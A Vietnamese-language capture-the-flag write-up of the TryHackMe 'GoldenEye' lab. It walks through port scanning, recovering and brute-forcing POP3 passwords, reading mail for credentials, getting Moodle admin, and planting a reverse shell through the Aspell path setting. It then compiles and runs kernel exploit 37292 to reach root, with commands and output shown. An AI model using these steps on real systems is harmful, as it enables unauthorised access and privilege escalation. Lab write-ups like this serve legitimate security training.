---
layout: post
author: "Neo"
title: "Tryhackme - GoldenEye"
date: "2022-04-19"
tags: [
  "tryhackme",
	"linux",
  "pop3",
  "telnet",
  "hydra",
  "moodle",
	"brute-force",
	"gcc"
]
categories: ctf
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}

![intro](/assets/img/2022-04-19-THM-GoldenEye/1.webp)

Xin chào, lại là tôi đây. Hôm nay tôi sẽ giải CTF [TryHackMe | GoldenEye](https://tryhackme.com/room/goldeneye)
## Reconnaissance

Việc đầu tiên là quét các port đang mở trên máy chủ mục tiêu

```python
PORT      STATE SERVICE  REASON  VERSION
25/tcp    open  smtp     syn-ack Postfix smtpd
| ssl-cert: Subject: commonName=ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:22:34
| Not valid after:  2028-04-21T03:22:34
| MD5:   cd4ad178f21617fb21a60a168f46c8c6
| SHA-1: fda3fc7b6601474696aa0f56b1261c2936e8442c
| -----BEGIN CERTIFICATE-----
| MIICsjCCAZqgAwIBAgIJAPokpqPNVgk6MA0GCSqGSIb3DQEBCwUAMBExDzANBgNV
| BAMTBnVidW50dTAeFw0xODA0MjQwMzIyMzRaFw0yODA0MjEwMzIyMzRaMBExDzAN
| BgNVBAMTBnVidW50dTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMM6
| ryxPHxf2wYf7DNTXnW6Hc6wK+O6/3JVeWME041jJdsY2UpxRB6cTmBIv7dAOHZzL
| eSVCfH1P3IS0dvSrqkA+zpPRK3to3SuirknpbPdmsNqMG1SiKLDl01o5LBDgIpcY
| V9JNNjGaxYBlyMjvPDDvgihmJwpb81lArUqDrGJIsIH8J6tqOdLt4DGBXU62sj//
| +IUE4w6c67uMAYQD26ZZH9Op+qJ3OznCTXwmJslIHQLJx+fXG53+BLiV06EGrsOk
| ovnPmixShoaySAsoGm56IIHQUWrCQ03VYHfhCoUviEw02q8oP49PHR1twt+mdj6x
| qZOBlgwHMcWgb1Em40UCAwEAAaMNMAswCQYDVR0TBAIwADANBgkqhkiG9w0BAQsF
| AAOCAQEAfigEwPIFEL21yc3LIzPvHUIvBM5/fWEEv0t+8t5ATPfI6c2Be6xePPm6
| W3bDLDQ30UDFmZpTLgLkfAQRlu4N40rLutTHiAN6RFSdAA8FEj72cwcX99S0kGQJ
| vFCSipVd0fv0wyKLVwbXqb1+JfmepeZVxWFWjiDg+JIBT3VmozKQtrLLL/IrWxGd
| PI2swX8KxikRYskNWW1isMo2ZXXJpdQJKfikSX334D9oUnSiHcLryapCJFfQa81+
| T8rlFo0zan33r9BmA5uOUZ7VlYF4Kn5/soSE9l+JbDrDFOIOOLLILoQUVZcO6rul
| mJjFdmZE4k3QPKz1ksaCAQkQbf3OZw==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
80/tcp    open  http     syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
55006/tcp open  ssl/pop3 syn-ack Dovecot pop3d
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost
| Issuer: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:23:52
| Not valid after:  2028-04-23T03:23:52
| MD5:   d0392e71c76a2cb3e694ec407228ec63
| SHA-1: 9d6a92eb5f9fe9ba6cbddc9355fa5754219b0b77
| -----BEGIN CERTIFICATE-----
| MIIDnTCCAoWgAwIBAgIJAOZHv9ZnCiJ+MA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV
| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG
| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe
| Fw0xODA0MjQwMzIzNTJaFw0yODA0MjMwMzIzNTJaMGUxHDAaBgNVBAoME0RvdmVj
| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j
| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAMo64gzxBeOvt+rgUQncWU2OJESGR5YJ9Mcd
| h0nF6m0o+zXwvkSx+SW5I3I/mpJugQfsc2lW4txo3xoAbvVgc2kpkkna8ojodTS3
| iUyKXwN3y2KG/jyBcrH+rZcs5FIpt5tDB/F1Uj0cdAUZ+J/v2NEw1w+KjlX2D0Zr
| xpgnJszmEMJ3DxNBc8+JiROMT7V8iYu9/Cd8ulAdS8lSPFE+M9/gZBsRbzRWD3D/
| OtDaPzBTlb6es4NfrfPBanD7zc8hwNL5AypUG/dUhn3k3rjUNplIlVD1lSesI+wM
| 9bIIVo3IFQEqiNnTdFVz4+EOr8hI7SBzsXTOrxtH23NQ6MrGbLUCAwEAAaNQME4w
| HQYDVR0OBBYEFFGO3VTitI69jNHsQzOz/7wwmdfaMB8GA1UdIwQYMBaAFFGO3VTi
| tI69jNHsQzOz/7wwmdfaMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AMm4cTA4oSLGXG+wwiJWD/2UjXta7XAAzXofrDfkRmjyPhMTsuwzfUbU+hHsVjCi
| CsjV6LkVxedX4+EQZ+wSa6lXdn/0xlNOk5VpMjYkvff0ODTGTmRrKgZV3L7K/p45
| FI1/vD6ziNUlaTzKFPkmW59oGkdXfdJ06Y7uo7WQALn2FI2ZKecDSK0LonWnA61a
| +gXFctOYRnyMtwiaU2+U49O8/vSDzcyF0wD5ltydCAqCdMTeeo+9DNa2u2IOZ4so
| yPyR+bfnTC45hue/yiyOfzDkBeCGBqXFYcox+EUm0CPESYYNk1siFjjDVUNjPGmm
| e1/vPH7tRtldZFSfflyHUsA=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: CAPA SASL(PLAIN) RESP-CODES UIDL TOP USER AUTH-RESP-CODE PIPELINING
55007/tcp open  pop3     syn-ack Dovecot pop3d
|_pop3-capabilities: CAPA RESP-CODES SASL(PLAIN) AUTH-RESP-CODE UIDL TOP STLS USER PIPELINING
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost
| Issuer: commonName=localhost/organizationName=Dovecot mail server/organizationalUnitName=localhost/emailAddress=root@localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:23:52
| Not valid after:  2028-04-23T03:23:52
| MD5:   d0392e71c76a2cb3e694ec407228ec63
| SHA-1: 9d6a92eb5f9fe9ba6cbddc9355fa5754219b0b77
| -----BEGIN CERTIFICATE-----
| MIIDnTCCAoWgAwIBAgIJAOZHv9ZnCiJ+MA0GCSqGSIb3DQEBCwUAMGUxHDAaBgNV
| BAoME0RvdmVjb3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAG
| A1UEAwwJbG9jYWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDAe
| Fw0xODA0MjQwMzIzNTJaFw0yODA0MjMwMzIzNTJaMGUxHDAaBgNVBAoME0RvdmVj
| b3QgbWFpbCBzZXJ2ZXIxEjAQBgNVBAsMCWxvY2FsaG9zdDESMBAGA1UEAwwJbG9j
| YWxob3N0MR0wGwYJKoZIhvcNAQkBFg5yb290QGxvY2FsaG9zdDCCASIwDQYJKoZI
| hvcNAQEBBQADggEPADCCAQoCggEBAMo64gzxBeOvt+rgUQncWU2OJESGR5YJ9Mcd
| h0nF6m0o+zXwvkSx+SW5I3I/mpJugQfsc2lW4txo3xoAbvVgc2kpkkna8ojodTS3
| iUyKXwN3y2KG/jyBcrH+rZcs5FIpt5tDB/F1Uj0cdAUZ+J/v2NEw1w+KjlX2D0Zr
| xpgnJszmEMJ3DxNBc8+JiROMT7V8iYu9/Cd8ulAdS8lSPFE+M9/gZBsRbzRWD3D/
| OtDaPzBTlb6es4NfrfPBanD7zc8hwNL5AypUG/dUhn3k3rjUNplIlVD1lSesI+wM
| 9bIIVo3IFQEqiNnTdFVz4+EOr8hI7SBzsXTOrxtH23NQ6MrGbLUCAwEAAaNQME4w
| HQYDVR0OBBYEFFGO3VTitI69jNHsQzOz/7wwmdfaMB8GA1UdIwQYMBaAFFGO3VTi
| tI69jNHsQzOz/7wwmdfaMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB
| AMm4cTA4oSLGXG+wwiJWD/2UjXta7XAAzXofrDfkRmjyPhMTsuwzfUbU+hHsVjCi
| CsjV6LkVxedX4+EQZ+wSa6lXdn/0xlNOk5VpMjYkvff0ODTGTmRrKgZV3L7K/p45
| FI1/vD6ziNUlaTzKFPkmW59oGkdXfdJ06Y7uo7WQALn2FI2ZKecDSK0LonWnA61a
| +gXFctOYRnyMtwiaU2+U49O8/vSDzcyF0wD5ltydCAqCdMTeeo+9DNa2u2IOZ4so
| yPyR+bfnTC45hue/yiyOfzDkBeCGBqXFYcox+EUm0CPESYYNk1siFjjDVUNjPGmm
| e1/vPH7tRtldZFSfflyHUsA=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
```

Có __4 port__ đang mở.

## Enumeration

Vì có port 80 nên tôi sẽ bắt đầu với web trước.

![web](/assets/img/2022-04-19-THM-GoldenEye/2.webp)

Tìm kiếm trong source web tôi có 1 file js

```html
<html>
<head>
<title>GoldenEye Primary Admin Server</title>
<link rel="stylesheet" href="[index.css](view-source:http://10.10.169.41/index.css)">
</head>

	<span id="GoldenEyeText" class="typeing"></span><span class='blinker'>&#32;</span>

<script src="[terminal.js](view-source:http://10.10.169.41/terminal.js)"></script>
	
</html>
```

Truy cập vào file js này tôi tìm được vài thứ thú vị

```js
var data = [
  {
    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
  }
];

//
//Boris, make sure you update your default password. 
//My sources say MI6 maybe planning to infiltrate. 
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//

var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;

 
  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}
```

Người phải thay đổi password là __Boris__.

Và khi giải mã đoạn code với HTML decoder, tôi tìm được password của anh ta.

Truy cập vào path */sev-home/* và login bằng username và password vừa tìm được

![sev-home](/assets/img/2022-04-19-THM-GoldenEye/3.webp)

Thử vào source web xem có gì đặc biệt không

```python
</video>
<div id="golden">
<h1>GoldenEye</h1>
<p>GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO) </p>
<p>Please email a qualified GNO supervisor to receive the online <b>GoldenEye Operators Training</b> to become an Administrator of the GoldenEye system</p>
<p>Remember, since <b><i>security by obscurity</i></b> is very effective, we have configured our pop3 service to run on a very high non-default port</p>
</div>

...

Qualified GoldenEye Network Operator Supervisors: 
Natalya
Boris
```

Để ý 1 chút khi có nhắc đến pop3. Tôi sẽ thử khai thác qua email

```python
┌──(kali㉿kali)-[~]
└─$ telnet 10.10.52.162 55007
Trying 10.10.52.162...
Connected to 10.10.52.162.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
user boris
+OK
pass InvincibleHack3r
-ERR [AUTH] Authentication failed.
```

Không khả thi cho lắm. Tuy nhiên tôi còn 1 cái tên nữa là *natalya*, và để tìm được password của user này thì tôi lại quay về cách đơn giản nhất thôi - bruteforce.

`[55007][pop3] host: 10.10.52.162   login: natalya   password: bird`

Tôi cũng sẽ thử lại với user *boris* vì có thể pass phía trên không phải pass để login pop3

`[55007][pop3] host: 10.10.52.162   login: boris   password: secret1!`

Login lại pop3

```python
┌──(kali㉿kali)-[~]
└─$ telnet 10.10.52.162 55007                                                                                  
Trying 10.10.52.162...
Connected to 10.10.52.162.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
user natalya
+OK
pass bird
+OK Logged in.
list
+OK 2 messages:
1 631
2 1048
```

Message 1

```python
retr 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
```

Message 2

```python
retr 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
```

Theo như message 2, tôi phải thêm domain vào file hosts và vào domain *severnaya-station.com/gnocertdir* để login với user và password phía trên

![moodle](/assets/img/2022-04-19-THM-GoldenEye/4.webp)

Sau khi đã thêm domain và hosts và truy cập url, tôi được 1 trang web sử dụng  *Moodle* LMS.

Đăng nhập bằng user và pass ở phía trên, vào được user này tôi có 1 message chưa đọc

![doak](/assets/img/2022-04-19-THM-GoldenEye/5.webp)

Ở đây tôi còn có thêm 1 user nữa tên là *Doak*. Thử bruteforce user này luôn

`[55007][pop3] host: 10.10.52.162   login: doak   password: goat`

```python
┌──(kali㉿kali)-[~]
└─$ telnet 10.10.52.162 55007
Trying 10.10.52.162...
Connected to 10.10.52.162.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
user doak
+OK
pass goat
+OK Logged in.
list
+OK 1 messages:
1 606
.
retr 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 97DC24549D
        for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!
```

Login moodle với user này. Dạo quanh 1 chút tôi tìm thấy 1 file có tên *s3cret.txt* bên trong phần *My private files*. Tải file đó về 

*007,

*I was able to capture this apps adm1n cr3ds through clear txt. 

*Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.

*Something juicy is located here: /dir007key/for-007.jpg

*Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.*

Tải ảnh theo đường dẫn trên về và phân tích

```python
┌──(kali㉿kali)-[~]
└─$ exiftool for-007.jpg 
ExifTool Version Number         : 12.51
File Name                       : for-007.jpg
Directory                       : .
File Size                       : 15 kB
File Modification Date/Time     : 2018:04:24 20:40:02-04:00
File Access Date/Time           : 2022:12:27 23:35:57-05:00
File Inode Change Date/Time     : 2022:12:27 23:35:47-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066

┌──(kali㉿kali)-[~]
└─$ echo eFdpbnRlcjE5OTV4IQ== | base64 -d                       
xWinter1995x!   
```

Đăng nhập moodle với user *admin* và pass là đoạn code tôi vừa tìm được.

## RCE

Tiếp theo phải tìm cách để lấy RCE. 

Theo như trong phần hướng dẫn trong task, tìm đến Aspell, sau đó đổi *Spell engine* thành PSpellShell và thay đổi *Path to aspell* thành reverse shell chứa IP và port mà tôi muốn gọi về máy local.

![aspell](/assets/img/2022-04-19-THM-GoldenEye/6.webp)

Bây giờ để kích hoạt được shell này, tôi phải thực hiện spell check và server sẽ gọi spellpath mà tôi đã thay đổi thành shell ban nãy.

Trước khi spell check thì cần tạo listener với port vừa cấu hình trong shell

`Navigation -> Home -> My Profile -> Blogs -> Add a new entry`

![spellcheck](/assets/img/2022-04-19-THM-GoldenEye/7.webp)

Ấn vào dấu tích xanh ABC trên thanh công cụ và quay lại listener 

```python
┌──(kali㉿kali)-[~/CVE-2020-14321]
└─$ nc -lnvp 9001                                     
listening on [any] 9001 ...
connect to [10.6.0.191] from (UNKNOWN) [10.10.165.144] 44411
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ uname -a
uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
$ 
```

## Privilege escalation

Tiếp theo, cũng trong phần mô tả của task, tôi sẽ tải exploit 37292 về để đẩy nó lên máy remote và dùng gcc để complie nó.

```python
$ gcc 37292.c -o exploit
gcc 37292.c -o exploit
/bin/sh: 11: gcc: not found
```

Máy này không có gcc, vậy thì tôi sẽ thử dùng cc

```python
$ cc 37292.c -o exploit
cc 37292.c -o exploit
37292.c:94:1: warning: control may reach end of non-void function [-Wreturn-type]
}
^
37292.c:106:12: warning: implicit declaration of function 'unshare' is invalid in C99 [-Wimplicit-function-declaration]
        if(unshare(CLONE_NEWUSER) != 0)
           ^
37292.c:111:17: warning: implicit declaration of function 'clone' is invalid in C99 [-Wimplicit-function-declaration]
                clone(child_exec, child_stack + (1024*1024), clone_flags, NULL);
                ^
37292.c:117:13: warning: implicit declaration of function 'waitpid' is invalid in C99 [-Wimplicit-function-declaration]
            waitpid(pid, &status, 0);
            ^
37292.c:127:5: warning: implicit declaration of function 'wait' is invalid in C99 [-Wimplicit-function-declaration]
    wait(NULL);
    ^
5 warnings generated.
```

```python
$ ./exploit
./exploit
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# ls -la /root
ls -la /root
total 44
drwx------  3 root root 4096 Apr 29  2018 .
drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
-rw-r--r--  1 root root   19 May  3  2018 .bash_history
-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
drwx------  2 root root 4096 Apr 28  2018 .cache
-rw-------  1 root root  144 Apr 29  2018 .flag.txt
-rw-r--r--  1 root root  140 Feb 19  2014 .profile
-rw-------  1 root root 1024 Apr 23  2018 .rnd
-rw-------  1 root root 8296 Apr 29  2018 .viminfo
```
